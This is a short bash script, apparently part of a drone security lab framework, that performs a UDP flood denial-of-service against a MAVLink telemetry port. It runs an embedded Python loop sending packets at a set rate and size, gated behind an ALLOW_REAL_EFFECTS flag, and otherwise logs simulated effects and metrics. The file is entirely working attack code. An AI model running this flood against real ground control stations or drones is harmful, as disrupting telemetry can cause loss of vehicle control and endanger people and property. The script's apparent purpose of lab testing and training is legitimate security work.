#!/usr/bin/env bash
# Telemetry UDP flood DoS toward MAVLink port (lab-safe).
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/sh_core/metrics.sh"

: "${DUR:=8}"
: "${PKT_SIZE:=250}"
: "${RATE_PPS:=1000}"

flood_real(){
  docker exec "$DVD_C_GCS" bash -lc "python3 - <<'PY'
import socket, time, os
host=os.environ.get('DVD_MAVLINK_HOST','127.0.0.1')
port=int(os.environ.get('DVD_MAVLINK_PORT','14550'))
dur=int(os.environ.get('DUR','8'))
pps=int(os.environ.get('RATE_PPS','1000'))
sz=int(os.environ.get('PKT_SIZE','250'))
sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload=b'F'*sz
t0=time.time()
interval=1.0/max(1,pps)
while time.time()-t0<dur:
    sock.sendto(payload,(host,port))
    time.sleep(interval)
PY" >/dev/null 2>&1 || true
}

main(){
  log "[telemetry_flood_dos] mode=$LPC_MODE dur=${DUR} size=${PKT_SIZE} rate=${RATE_PPS}pps"
  local before after; before=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF")
  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then flood_real; fi
  bus_emit "telemetry" "action=flood_udp target=${DVD_MAVLINK_HOST}:${DVD_MAVLINK_PORT} pps=${RATE_PPS} size=${PKT_SIZE}"
  effect_emit "jitter_ms=2"
  sleep 1
  after=$(obs_snapshot "$DVD_C_GCS" "$DVD_TARGET_IF"); delta_emit "$before" "$after" "telemetry_obs"
}
main "$@"
